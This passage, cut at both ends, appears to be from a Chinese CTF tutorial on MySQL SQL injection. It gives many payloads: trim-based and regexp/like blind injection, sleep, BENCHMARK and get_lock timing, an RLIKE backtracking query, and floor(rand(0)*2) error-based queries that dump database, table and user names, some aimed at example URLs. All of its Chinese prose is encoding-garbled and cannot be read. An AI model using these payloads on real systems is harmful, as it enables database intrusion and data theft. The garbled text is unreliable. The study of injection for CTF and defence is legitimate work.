ã€‚ è¿™é‡Œä¸è€ƒè™‘å¤šå­—èŠ‚å­—ç¬¦ï¼Œæ¯”å¦‚æ±‰å­—</p></li><li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p><ul><li><code>ltrim(s);</code> å»æ‰å­—ç¬¦ä¸²så¼€å§‹å¤„çš„ç©ºæ ¼ </li><li><code>rtrim(s);</code> å»æ‰å­—ç¬¦ä¸²sç»“å°¾å¤„çš„ç©ºæ ¼ </li><li><code>trim(s);</code> å»æ‰å­—ç¬¦ä¸²å¼€å§‹å’Œç»“å°¾å¤„çš„ç©ºæ ¼</li></ul><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">TRIM</span>([<span class="hljs-keyword">BOTH</span><span class="hljs-operator">/</span><span class="hljs-keyword">LEADING</span><span class="hljs-operator">/</span><span class="hljs-keyword">TRAILING</span>] ç›®æ ‡å­—ç¬¦ä¸² <span class="hljs-keyword">FROM</span> æºå­—ç¬¦ä¸²);<br><span class="hljs-keyword">BOTH</span>åˆ é™¤ä¸¤è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸² <br><span class="hljs-keyword">LEADING</span>åˆ é™¤å·¦è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸² <br>TARILINGåˆ é™¤å³è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;) <span class="hljs-operator">=</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;);<br></code></pre></td></tr></table></figure><p>ä»¥è¿™ä¸ªä¸ºä¾‹ï¼Œæˆ‘ä»¬å°†åˆ é™¤çš„å­—ç¬¦ä¸²ASCIIå·®é™åˆ¶åœ¨1ï¼Œä¾‹å¦‚aå’Œb å½“è¿™ä¸ªç»“æœè¿”å›0æ—¶(è¯´æ˜æœ‰ä¸€ä¸ªæˆåŠŸåŒ¹é…)ï¼Œåˆ™ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aæˆ–è€…bã€‚ </p><p>æ¥ç€è®©açš„ASCII+2å˜æˆcï¼Œå¦‚æœè¿”å›1(bcéƒ½ä¸åŒ¹é…)ï¼Œåˆ™å­—ç¬¦ä¸²ç¬¬ä¸€ä½ä¸ºaï¼Œåä¹‹ç¬¬ä¸€ä½ä¸ºbã€‚</p><p>è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿å†™è„šæœ¬ ç¬¬äºŒä¸ªå­—ç¬¦åˆ¤æ–­ select trim(LEADING â€œaaâ€ from â€œabcdâ€) &#x3D; trim(LEADING â€œabâ€ from â€œabcdâ€); æ¥ç€é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ï¼Œåˆ¤æ–­ç¬¬äºŒä¸ªå­—ç¬¦ ä»¥æ­¤æ¨å‡ºæ•´ä¸ªå­—ç¬¦ä¸²</p><p>å¦‚æœ&#x3D;ç”¨regexpæ›¿ä»£é‚£ä¹ˆæ­£ç¡®çš„å­—ç¬¦ä¸€å®šåœ¨regexpå‰é¢ä»¥è¿™ä¸ªabcdä¸ºä¾‹ Trim(leading â€˜aâ€™ from â€˜abcdâ€™) regexp trim(LEADING â€˜xâ€™ from â€˜abcdâ€™) å°±æ˜¯bcd regexp abcdè¿”å›0ï¼Œ å¦‚æœåè¿‡æ¥å°±æ˜¯abcd regexp bcd è¿”å›1 å› æ­¤åªéœ€åˆ¤æ–­ç¬¬ä¸€æ­¥å³å¯ï¼Œè€Œä¸éœ€è¦ASCII+2å»åˆ¤æ–­äº† </p><p>âš ï¸ï¼šå¦‚æœç”¨regexpï¼Œè¦å…ˆåœ¨<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>çš„æ¡ä»¶ä¸‹ï¼Œå› ä¸ºä¸¤ä¸ªç›¸åŒå­—ç¬¦ä¸²é—´çš„regexpä¹Ÿä¼šè¿”å›1</p><p>æ³¨ï¼šy1ngå¸ˆå‚…åœ¨[HFCTF 2021 Final]hatenumä¸­ç”¨åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œé€šè¿‡æŒç»­é€’å½’ï¼Œå¤šæ¬¡å¥—å¨ƒtrimã€‚å¦‚æœå­—ç¬¦ä¸²é•¿åº¦è¢«é™åˆ¶ï¼Œå¯ä½¿ç”¨ã€‚ä¸€æ¬¡åªæˆªæ–­å‡ ä¸ªå­—ç¬¦</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;)); <span class="hljs-comment">-- cd </span><br></code></pre></td></tr></table></figure><p>å…ˆæˆªæ–­aï¼Œè¿”å›å­—ç¬¦ä¸²bcdï¼Œåœ¨æˆªæ–­bï¼Œè¿”å›å­—ç¬¦ä¸²cd</p></blockquote></li><li><p>Insert()</p><blockquote><p><code>INSERT(s1,x,len,s2)</code> å­—ç¬¦ä¸² s2 æ›¿æ¢ s1 çš„ x ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­—ç¬¦ä¸²</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä¾‹å­ï¼šç¬¬ä¸€æ­¥åˆ é™¤èµ·å§‹çš„å‰xä½<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;);<br><span class="hljs-comment">-- è¾“å‡ºï¼šabcdef</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;);<br><span class="hljs-comment">-- è¾“å‡ºï¼šbcdef</span><br>ç¬¬äºŒæ­¥å¥—å¨ƒåˆ é™¤x<span class="hljs-operator">+</span><span class="hljs-number">1</span>ä½ä»¥åçš„æ‰€æœ‰<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- è¾“å‡ºï¼ša</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- è¾“å‡ºï¼šb</span><br></code></pre></td></tr></table></figure></blockquote></li></ul><h3 id="ç›²æ³¨å¸¸ç”¨æ–¹æ³•"><a href="#ç›²æ³¨å¸¸ç”¨æ–¹æ³•" class="headerlink" title="ç›²æ³¨å¸¸ç”¨æ–¹æ³•"></a>ç›²æ³¨å¸¸ç”¨æ–¹æ³•</h3><ul><li><p>if&#x2F;case ç”¨åœ¨selectæŸ¥è¯¢å½“ä¸­ï¼Œå½“åšä¸€ç§æ¡ä»¶æ¥è¿›è¡Œåˆ¤æ–­</p><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(æ¡ä»¶,ä¸ºçœŸç»“æœ,ä¸ºå‡ç»“æœ)<br># <span class="hljs-keyword">case</span>è¯­æ³•ï¼ˆä¸¤ç§ï¼‰<br>ç®€å•å‡½æ•° <br><span class="hljs-keyword">CASE</span> [col_name] <span class="hljs-keyword">WHEN</span> [value1] <span class="hljs-keyword">THEN</span> [result1]â€¦<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br>æœç´¢å‡½æ•° <br><span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> [expr] <span class="hljs-keyword">THEN</span> [result1]â€¦<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">12</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">3</span><span class="hljs-operator">&lt;</span><span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-keyword">then</span> <span class="hljs-number">3</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœç´¢å‡½æ•°ä¼˜å…ˆåŒ¹é…ç¬¬ä¸€ä¸ªä¸ºçœŸçš„æ¡ä»¶,ä¹Ÿå¯ä»¥åªå†™ä¸€ä¸ªæ¡ä»¶ï¼Œä»£æ›¿ifè¯­å¥</p></blockquote></li><li><p>regexp&#x2F;rlike æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ï¼ˆå¯ä»¥ä»£æ›¿ifï¼‰</p><blockquote> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>); # iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™<br><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br></code></pre></td></tr></table></figure> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p> è¿™é‡Œåªè¦æ›´æ¢regexpè¡¨è¾¾å¼å³å¯</p><p> <img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg" alt="image-20220708162044974"></p><p> æ³¨ï¼šregexpä¸åŒºåˆ†å¤§å°å†™ï¼Œéœ€è¦å¤§å°å†™æ•æ„Ÿè¦åŠ ä¸Šbinaryå…³é”®å­—</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-type">binary</span> database() regexp &quot;^CTF&quot;;<br></code></pre></td></tr></table></figure></blockquote></li><li><p>likeåŒ¹é…æ³¨å…¥(é€‚ç”¨äº&#x3D;è¢«è¿‡æ»¤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>benchmarkå‡½æ•° æµ‹è¯•æ“ä½œæ€§èƒ½</p></li><li><p>get_lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>ç¬¬ä¸€ä¸ªè¿æ¥<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>æ‰“å¼€å¦ä¸€ä¸ªcmd  å†æ¬¡è¿æ¥mysqlï¼Œæ‰§è¡Œget_lockï¼Œå‘ç°å»¶æ—¶<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">1.00</span> sec)<br></code></pre></td></tr></table></figure><blockquote><p>åˆ©ç”¨åœºæ™¯æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼šéœ€è¦æä¾›é•¿è¿æ¥ã€‚åœ¨Apache+PHPæ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨mysql_pconnect(æ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æŒä¹…è¿æ¥)å‡½æ•°æ¥è¿æ¥æ•°æ®åº“ã€‚åœ¨CTFä¸­ï¼Œåªæœ‰å‡ºé¢˜äººå¾ˆåˆ»æ„çš„ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰æš—ç¤ºä½¿ç”¨è¿™ä¸ª</p></blockquote></li></ul><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))#<br># sleepå»¶æ—¶<br><span class="hljs-keyword">select</span> sleep(find_in_set(mid(@<span class="hljs-variable">@version</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# åœ¨<span class="hljs-number">0</span><span class="hljs-number">-9.</span>ä¸­æ‰¾ç‰ˆæœ¬å·ç¬¬ä¸€ä½<br></code></pre></td></tr></table></figure><blockquote><p>sleepå‡½æ•°å»¶æ—¶ä¸å¸¸ç”¨ï¼Œæ—¶é—´å¯èƒ½å› ç½‘é€Ÿå½±å“</p></blockquote><p>åˆ©ç”¨BENCHMARK()è¿›è¡Œå»¶æ—¶æ³¨å…¥ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> (IF(<span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>),BENCHMARK(<span class="hljs-number">50000000</span>,ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)),<span class="hljs-keyword">null</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> database() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1<span class="hljs-comment">--+</span><br># å½“ç»“æœæ­£ç¡®çš„æ—¶å€™ï¼Œè¿è¡ŒENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)æ“ä½œ<span class="hljs-number">50000000</span> æ¬¡ï¼Œä¼šå ç”¨ä¸€æ®µæ—¶é—´ã€‚<br></code></pre></td></tr></table></figure><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h3 id="æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™"><a href="#æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™" class="headerlink" title="æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™"></a>æŠ¥é”™ç›²æ³¨â€“flooræŠ¥é”™</h3><p><u>é€‚ç”¨äºä½ç‰ˆæœ¬ï¼Œmysql8ä¼¼ä¹è¢«ä¿®å¤</u></p><p>flooræŠ¥é”™æ³¨å…¥æ˜¯åˆ©ç”¨ <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>è¿™ä¸ªç›¸å¯¹å›ºå®šçš„è¯­å¥æ ¼å¼ï¼Œå¯¼è‡´çš„æ•°æ®åº“æŠ¥é”™</p><h4 id="å‡½æ•°è¯´æ˜"><a href="#å‡½æ•°è¯´æ˜" class="headerlink" title="å‡½æ•°è¯´æ˜"></a>å‡½æ•°è¯´æ˜</h4><ul><li>rand() æ˜¯ä¸€ä¸ªéšæœºå‡½æ•°(äº§ç”Ÿ0åˆ°1é—´éšæœºæµ®ç‚¹æ•°),ç›´æ¥ä½¿ç”¨æ¯æ¬¡äº§ç”Ÿçš„æ•°éƒ½ä¸åŒï¼Œä½†æ˜¯å½“æä¾›äº†ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼šè¿™æ ·æ¯æ¬¡äº§ç”Ÿçš„å€¼éƒ½æ˜¯ä¸€æ ·çš„ã€‚</li><li>floor(rand(0)*2ï¼‰ floor()æ˜¯å‘ä¸‹å–æ•´ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°åªå«0 1çš„ä¼ªéšæœºåºåˆ—</li></ul><h4 id="æŠ¥é”™åŸå› "><a href="#æŠ¥é”™åŸå› " class="headerlink" title="æŠ¥é”™åŸå› "></a>æŠ¥é”™åŸå› </h4><p>å½“æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶ä¼šæŠ¥é”™(ä¸»é”®å†²çª)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) x <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸»è¦åˆ©ç”¨floor(rand(0)*2)çš„ç»“æœè§„å¾‹ä¸º0 1 1 0 1 1ï¼Œå½“æ•°æ®è¡¨ä¸­æœ€å°‘éœ€è¦ä¸‰æ¡æ•°æ®æ‰ä¼šæŠ¥é”™</p><p>floor()æŠ¥é”™æ³¨å…¥çš„åŸå› æ˜¯group byåœ¨å‘ä¸´æ—¶è¡¨æ’å…¥æ•°æ®æ—¶ï¼Œç”±äºrand()å¤šæ¬¡è®¡ç®—å¯¼è‡´æ’å…¥ä¸´æ—¶è¡¨æ—¶ä¸»é”®é‡å¤ï¼Œä»è€ŒæŠ¥é”™ï¼Œåˆå› ä¸ºæŠ¥é”™å‰concat()ä¸­çš„SQLè¯­å¥æˆ–å‡½æ•°è¢«æ‰§è¡Œï¼Œæ‰€ä»¥è¯¥è¯­å¥æŠ¥é”™ä¸”è¢«æŠ›å‡ºçš„ä¸»é”®æ˜¯SQLè¯­å¥æˆ–å‡½æ•°æ‰§è¡Œåçš„ç»“æœã€‚</p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br>#ä¹Ÿå¯ä»¥ç®€åŒ–æˆ<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br>#å…³é”®è¡¨è¢«è¿‡æ»¤æ—¶<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">!</span><span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))<br>#randè¢«è¿‡æ»¤ é€‚ç”¨ç”¨æˆ·å˜é‡<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">min</span>(<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(password,<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(<span class="hljs-variable">@a</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">çˆ†åº“<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x )a;<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.hackblog.cn<span class="hljs-operator">/</span>sql.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span><br>concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br>çˆ†è¡¨<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> table_name <span 